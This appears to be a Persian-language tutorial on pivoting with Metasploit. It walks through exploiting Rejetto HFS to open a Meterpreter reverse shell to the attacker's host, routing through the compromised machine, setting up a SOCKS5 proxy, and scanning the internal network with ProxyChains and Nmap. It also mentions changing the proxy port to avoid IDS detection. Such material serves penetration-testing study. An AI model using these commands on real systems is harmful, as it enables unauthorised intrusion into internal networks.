



## 1️⃣ ایده کلی SOCKS Proxy در Pivoting

- توی روش قبل (`route add`) فقط ماژول‌های خود متاسپلویت می‌تونستن از مسیر Pivot استفاده کنن.
    
- با **SOCKS Proxy**، هر ابزاری که قابلیت اتصال از طریق پروکسی SOCKS رو داشته باشه (مثل Nmap، ProxyChains، Browser و ...) می‌تونه از سیستم قربانی به شبکه داخلیش بره.
    

---

## 2️⃣ مراحل اجرا

### **قدم ۱ – گرفتن Session**

اول با اکسپلویت HFS Session می‌گیریم:

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
run
```

---

### **قدم ۲ – پیدا کردن شبکه داخلی**

بعد از گرفتن Meterpreter:

```bash
sessions -i 1
ipconfig
arp -a
```

فرض کنیم قربانی به شبکه `192.168.10.0/24` وصل است.

---

### **قدم ۳ – افزودن Route**

خروج از Session (background):

```bash
background
route add 192.168.10.0 255.255.255.0 1
```

- اینجا `1` شماره Session است.
    

---

### **قدم ۴ – راه‌اندازی SOCKS Proxy**

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run
```

- این سرویس روی سیستم تو یک SOCKS5 Proxy راه‌اندازی می‌کند.
    
- هر ابزار خارجی که به `127.0.0.1:1080` وصل شود، از طریق Pivot به شبکه داخلی قربانی می‌رود.
    

---

### **قدم ۵ – استفاده از ProxyChains (لینوکس)**

روی سیستم خودت، فایل `/etc/proxychains.conf` رو ویرایش کن:

```
socks5  127.0.0.1 1080
```

حالا می‌توانی ابزارهایی مثل Nmap رو روی شبکه داخلی قربانی اجرا کنی:

```bash
proxychains nmap -sT 192.168.10.5 -p 80,445
```

---

## 3️⃣ مزیت این روش

- می‌توان از ابزارهای خارج از Metasploit استفاده کرد (Nmap، CrackMapExec، مرورگر و ...).
    
- نسبت به `portfwd` انعطاف‌پذیرتر است.
    
- یکبار راه‌اندازی می‌شود و برای کل Session قابل استفاده است.
    

---

## 4️⃣ نکته امنیتی

- اگر Session قطع شود، SOCKS Proxy هم قطع می‌شود.
    
- برای عبور کامل ترافیک باید مطمئن شوی ابزارهایت از SOCKS پشتیبانی کنند.
    
- IDS/IPS می‌تواند فعالیت غیرعادی را در پورت 1080 شناسایی کند، مگر اینکه تغییرش بدهی.
    

---
